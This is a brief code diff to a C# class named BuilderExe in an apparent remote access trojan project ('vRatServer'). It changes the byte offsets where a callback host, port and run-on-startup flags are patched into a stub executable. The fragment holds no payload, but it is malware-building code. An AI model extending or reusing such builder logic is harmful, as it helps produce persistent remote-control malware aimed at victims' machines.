@@ -7,11 +7,11 @@ namespace vRatServer.Classes
 {
     public class BuilderExe
     {
-        static int baseoffset = 0x9a00;
-        int host_offset = baseoffset + 0x40;
-        int port_ofsset= baseoffset + 0x1d0;
-        int runOnce_offset= baseoffset+4;
-        int runStartup_offset= baseoffset;
+        static int baseoffset = 0xa200;
+        int host_offset = baseoffset;
+        int port_ofsset= baseoffset + 0x1cc;
+        int runOnce_offset= baseoffset+0x194;
+        int runStartup_offset= baseoffset+0x190;
 
         public BuilderExe(string host,ushort port,bool runOnce,bool runOnStartup)
         {
